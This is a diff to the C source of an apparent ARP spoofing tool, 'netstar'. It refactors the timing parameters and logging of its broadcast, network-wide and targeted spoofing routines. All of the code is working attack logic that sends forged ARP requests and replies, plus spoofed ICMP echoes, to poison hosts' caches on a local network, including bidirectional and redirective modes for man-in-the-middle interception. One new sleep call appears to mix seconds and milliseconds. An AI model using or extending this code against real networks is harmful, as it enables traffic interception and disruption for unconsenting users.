@@ -39,6 +39,15 @@ netstar_arp_broadcast_spoofing(void *context) {
 
   netstar_timer_t timer = NETSTAR_TIMER_INITIALIZER;
 
+  netstar_log(
+    "\b \b[ arp@broadcast-spoofing ]: spoof-burst-interval: %" PRIu32 "s; "
+                                     "spoof-burst-count: %zu; "
+                                     "spoof-steady-interval: %" PRIu32 "\r\n",
+    netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval),
+    spoofing_attack->spoof_burst_count,
+    netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval)
+  );
+
   netstar_recon_hosts4(netstar, spoofing_attack->spoofed_hosts);
 
   for (; thread->status;) {
@@ -51,21 +60,28 @@ netstar_arp_broadcast_spoofing(void *context) {
 
         netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &MACIEEE802_BROADCAST, NETSTAR_ARP_OPCODE_REQUEST, &netstar->managed.iface->mac, &spoofed_host->addr.v4, &MACIEEE802_BROADCAST, &daddr);
 
-     // netstar_log("\b \b[ arp@broadcast-spoofing ] %s %s via broadcast\r\n",
-     //   smac, saddr
-     // );  
+#ifdef NETSTAR_DEBUG
+        {
+          char saddr[NETWORK_IPADDR4_STRLENGTH] = {0};
+
+          network_ipaddr4_format(&spoofed_host->addr.v4, saddr, sizeof(saddr));
+
+          netstar_log("\b \b[ arp@broadcast-spoofing ] %s %s ARP Request (0x%04" PRIX16 ") via FF:FF:FF:FF:FF:FF\r\n",
+            saddr, netstar_vendors_namebymac(&spoofed_host->mac),
+            NETSTAR_ARP_OPCODE_REQUEST
+          );
+        }
+#endif
 
         netstar_time_sleep(20);
       }
 
-      netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->shockwave_time));
+      netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval));
     }
 
-    netstar_thread_sleep(thread, 4);
- // netstar_time_sleep(netstar_time_secstomillisecs(1));
+    netstar_time_sleep(netstar_time_secstomillisecs(2));
   }
 
-  netstar_log("#netstar-arp-broadcast-spoofing-thread exited\r\n");
   netstar_thread_exit(thread, NULL);
   return NULL;
 }
@@ -75,10 +91,10 @@ netstar_arp_broadcast_spoofing_new(struct netstar_arp_broadcast_spoofing *spoofi
   if (!(spoofing_attack->spoofed_hosts = netstar_hosts_new()))
     goto _return;
 
-  spoofing_attack->shockwave_time  = ((spoofing_attack->shockwave_time) ?: 1000);
-  spoofing_attack->shockwaves      = 10;
+  spoofing_attack->spoof_burst_interval = ((spoofing_attack->spoof_burst_interval) ?: netstar_time_secstomillisecs(1));
+  spoofing_attack->spoof_burst_count    = 10;
 
-  spoofing_attack->persistent_time = ((spoofing_attack->persistent_time) ?: 10000);
+  spoofing_attack->spoof_steady_interval = ((spoofing_attack->spoof_steady_interval) ?: netstar_time_secstomillisecs(4));
 
   spoofing_attack->netstar = netstar;
 
@@ -179,6 +195,17 @@ netstar_arp_network_spoofing(void *context) {
 
   netstar_timer_t timer = NETSTAR_TIMER_INITIALIZER;
 
+  netstar_log(
+    "\b \b[ arp@network-spoofing ]: network-scan-interval: %" PRIu32 "s; "
+                                   "spoof-burst-interval: %" PRIu32 "s; "
+                                   "spoof-burst-count: %zu; "
+                                   "spoof-steady-interval: %" PRIu32 "\r\n",
+    netstar_time_millisecstosecs(spoofing_attack->network_scan_interval),
+    netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval),
+    spoofing_attack->spoof_burst_count,
+    netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval)
+  );
+
   netstar_recon_hosts4(netstar, spoofing_attack->spoofed_hosts);
 
   if (spoofing_attack->redirective)
@@ -187,9 +214,7 @@ netstar_arp_network_spoofing(void *context) {
   netstar_log("\b \b[ arp@network-spoofing ] initializing host reconnaissances on the network\r\n");
 
   while (thread->status && netstar_hosts_size(netstar_scanner_scanned_hosts4) < 2) {
-    netstar_thread_sleep(thread, 4);
- // netstar_time_sleep(spoofing_attack->persistent_time); // +3500;
- // netstar_time_sleep(netstar_time_secstomillisecs(1));
+    netstar_time_sleep(netstar_time_millisecstosecs(spoofing_attack->network_scan_interval));
     continue;
   }
 
@@ -236,46 +261,46 @@ netstar_arp_network_spoofing(void *context) {
             source_mac = spoofing_attack->redirection_host.mac;
           }
 
-          if (!spoofing_attack->shockwaves && !spoofing_attack->redirective)
+          if (!spoofing_attack->redirective)
             netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, NETSTAR_ICMP_TYPE_ECHO, &spoofed_host->addr.v4, &target_host->addr.v4);
 
           netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, opcode, &source_mac, &spoofed_host->addr.v4, &target_host->mac, &target_host->addr.v4);
 
           if (spoofing_attack->bidirectional) {
-            if (!spoofing_attack->shockwaves && !spoofing_attack->redirective)
+            if (!spoofing_attack->redirective)
               netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, NETSTAR_ICMP_TYPE_ECHO, &target_host->addr.v4, &spoofed_host->addr.v4);
 
             netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, opcode, &source_mac, &target_host->addr.v4, &spoofed_host->mac, &spoofed_host->addr.v4);
           }
 
-       // {
-       //   char saddr[NETWORK_IPADDR4_STRLENGTH] = {0}, daddr[NETWORK_IPADDR4_STRLENGTH] = {0};
-       //
-       //   network_ipaddr4_format(&spoofed_host->addr.v4, saddr, sizeof(saddr));
-       //   network_ipaddr4_format(&target_host->addr.v4, daddr, sizeof(daddr));
-       //
-       //   netstar_log("\b \b[ arp@network-spoofing ] %s %s %s (0x%04" PRIX16 ") %s spoofing %s %s\r\n",
-       //     saddr, netstar_vendors_namebymac(&spoofed_host->mac),
-       //     ((spoofing_attack->request) ? "request" : "reply"), opcode,
-       //     ((spoofing_attack->bidirectional) ? "bidirectional" : "directional"),
-       //     netstar_vendors_namebymac(&target_host->mac), daddr
-       //   );
-       // }
+#ifdef NETSTAR_DEBUG
+          {
+            char saddr[NETWORK_IPADDR4_STRLENGTH] = {0}, daddr[NETWORK_IPADDR4_STRLENGTH] = {0};
 
+            network_ipaddr4_format(&spoofed_host->addr.v4, saddr, sizeof(saddr));
+            network_ipaddr4_format(&target_host->addr.v4, daddr, sizeof(daddr));
+
+            netstar_log("\b \b[ arp@network-spoofing ] %s %s ARP %s (0x%04" PRIX16 ") %s spoofing %s %s\r\n",
+              saddr, netstar_vendors_namebymac(&spoofed_host->mac),
+              ((spoofing_attack->request) ? "Request" : "Reply"), opcode,
+              ((spoofing_attack->bidirectional) ? "bidirectional" : "directional"),
+              netstar_vendors_namebymac(&target_host->mac), daddr
+            );
+          }
+#endif
           netstar_time_sleep(20);
         }
       }
 
-      if (spoofing_attack->shockwaves) {
-        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->shockwave_time));
-        spoofing_attack->shockwaves--;
+      if (spoofing_attack->spoof_burst_count) {
+        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval));
+        spoofing_attack->spoof_burst_count--;
       } else {
-        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->persistent_time));
+        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval));
       }
     }
 
-    netstar_thread_sleep(thread, 4);
- // netstar_time_sleep(netstar_time_secstomillisecs(1));
+    netstar_time_sleep(netstar_time_secstomillisecs(2));
   }
 
   netstar_thread_exit(thread, NULL);
@@ -290,10 +315,12 @@ netstar_arp_network_spoofing_new(struct netstar_arp_network_spoofing *spoofing_a
   if (!(spoofing_attack->protected_hosts = netstar_hosts_new()))
     goto _return;
 
-  spoofing_attack->shockwave_time  = ((spoofing_attack->shockwave_time) ?: 1000);
-  spoofing_attack->shockwaves      = 10;
+  spoofing_attack->network_scan_interval = ((spoofing_attack->network_scan_interval) ?: netstar_time_secstomillisecs(4));
 
-  spoofing_attack->persistent_time = ((spoofing_attack->persistent_time) ?: 10000);
+  spoofing_attack->spoof_burst_interval  = ((spoofing_attack->spoof_burst_interval) ?: netstar_time_secstomillisecs(1));
+  spoofing_attack->spoof_burst_count     = 10;
+
+  spoofing_attack->spoof_steady_interval = ((spoofing_attack->spoof_steady_interval) ?: netstar_time_secstomillisecs(4));
 
   spoofing_attack->netstar = netstar;
 
@@ -395,6 +422,14 @@ netstar_arp_spoofing(void *context) {
 
   netstar_timer_t timer = NETSTAR_TIMER_INITIALIZER;
 
+  netstar_log("\b \b[ arp@spoofing ]: spoof-burst-interval: %" PRIu32 "s; "
+                                     "spoof-burst-count: %zu; "
+                                     "spoof-steady-interval: %" PRIu32 "\r\n",
+    netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval),
+    spoofing_attack->spoof_burst_count,
+    netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval)
+  );
+
   if (spoofing_attack->redirective) {
     netstar_log("\b \b[ arp@spoofing ] running on redirectional mode\r\n");
     netstar_recon_host4(netstar, &spoofing_attack->redirection_host);
@@ -426,46 +461,46 @@ netstar_arp_spoofing(void *context) {
             source_mac = spoofing_attack->redirection_host.mac;
           }
 
-          if (!spoofing_attack->shockwaves && !spoofing_attack->redirective)
+          if (!spoofing_attack->redirective)
             netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, NETSTAR_ICMP_TYPE_ECHO, &spoofed_host->addr.v4, &target_host->addr.v4);
 
           netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &target_host->mac, opcode, &source_mac, &spoofed_host->addr.v4, &target_host->mac, &target_host->addr.v4);
 
           if (spoofing_attack->bidirectional) {
-            if (/* !spoofing_attack->shockwaves && */ !spoofing_attack->redirective)
+            if (!spoofing_attack->redirective)
               netstar_sendicmpecho(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, NETSTAR_ICMP_TYPE_ECHO, &target_host->addr.v4, &spoofed_host->addr.v4);
 
             netstar_sendarp(&netstar->managed, &netstar->managed.iface->mac, &spoofed_host->mac, opcode, &source_mac, &target_host->addr.v4, &spoofed_host->mac, &spoofed_host->addr.v4);
           }
 
-       // {
-       //   char saddr[NETWORK_IPADDR4_STRLENGTH] = {0}, daddr[NETWORK_IPADDR4_STRLENGTH] = {0};
-       //
-       //   network_ipaddr4_format(&spoofed_host->addr.v4, saddr, sizeof(saddr));
-       //   network_ipaddr4_format(&target_host->addr.v4, daddr, sizeof(daddr));
-       //
-       //   netstar_log("\b \b[ arp@spoofing ] %s %s ARP %s (0x%04" PRIX16 ") %s spoofing %s %s\r\n",
-       //     saddr, netstar_vendors_namebymac(&spoofed_host->mac),
-       //     ((spoofing_attack->request) ? "Request" : "Reply"), opcode,
-       //     ((spoofing_attack->bidirectional) ? "bidirectional" : "directional"),
-       //     netstar_vendors_namebymac(&target_host->mac), daddr
-       //   );
-       // }
+#ifdef NETSTAR_DEBUG
+          {
+            char saddr[NETWORK_IPADDR4_STRLENGTH] = {0}, daddr[NETWORK_IPADDR4_STRLENGTH] = {0};
 
+            network_ipaddr4_format(&spoofed_host->addr.v4, saddr, sizeof(saddr));
+            network_ipaddr4_format(&target_host->addr.v4, daddr, sizeof(daddr));
+
+            netstar_log("\b \b[ arp@spoofing ] %s %s ARP %s (0x%04" PRIX16 ") %s spoofing %s %s\r\n",
+              saddr, netstar_vendors_namebymac(&spoofed_host->mac),
+              ((spoofing_attack->request) ? "Request" : "Reply"), opcode,
+              ((spoofing_attack->bidirectional) ? "bidirectional" : "directional"),
+              netstar_vendors_namebymac(&target_host->mac), daddr
+            );
+          }
+#endif
           netstar_time_sleep(20);
         }
       }
 
-      if (spoofing_attack->shockwaves) {
-        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->shockwave_time));
-        spoofing_attack->shockwaves--;
+      if (spoofing_attack->spoof_burst_count) {
+        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_burst_interval));
+        spoofing_attack->spoof_burst_count--;
       } else {
-        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->persistent_time));
+        netstar_timer_start(&timer, netstar_time_millisecstosecs(spoofing_attack->spoof_steady_interval));
       }
     }
 
-    netstar_thread_sleep(thread, 4);
- // netstar_time_sleep(netstar_time_secstomillisecs(1));
+    netstar_time_sleep(netstar_time_secstomillisecs(2));
   }
 
   netstar_thread_exit(thread, NULL);
@@ -479,10 +514,10 @@ netstar_arp_spoofing_new(struct netstar_arp_spoofing *spoofing_attack, netstar_t
   if (!(spoofing_attack->target_hosts = netstar_hosts_new()))
     goto _return;
 
-  spoofing_attack->shockwave_time  = ((spoofing_attack->shockwave_time) ?: 1000);
-  spoofing_attack->shockwaves      = 10;
+  spoofing_attack->spoof_burst_interval  = ((spoofing_attack->spoof_burst_interval) ?: netstar_time_secstomillisecs(2));
+  spoofing_attack->spoof_burst_count      = 10;
 
-  spoofing_attack->persistent_time = ((spoofing_attack->persistent_time) ?: 10000);
+  spoofing_attack->spoof_steady_interval = ((spoofing_attack->spoof_steady_interval) ?: netstar_time_secstomillisecs(4));
 
   spoofing_attack->netstar = netstar;
 
